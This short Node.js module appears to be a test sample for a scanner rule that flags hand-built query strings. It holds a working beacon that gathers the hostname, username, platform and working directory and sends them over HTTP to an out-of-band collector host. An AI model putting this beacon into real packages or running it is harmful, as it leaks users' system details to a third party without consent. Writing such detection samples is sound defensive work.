// Manual query-string host-profile beacon over http.get to an OOB
// collector. The URLSearchParams/https twin stays silent here while the
// manual-qs rule fires.
const os = require('os');
const http = require('http');
const OOB = 'collector-000.oast.fun';
function beacon() {
  const info = {
    host: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform() + '-' + os.arch(),
    dir: process.cwd()
  };
  const qs = Object.keys(info).map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(String(info[k]))).join('&');
  http.get({ host: OOB, port: 80, path: '/collect?' + qs, timeout: 3000 }, (res) => { res.resume(); });
}
module.exports = beacon;
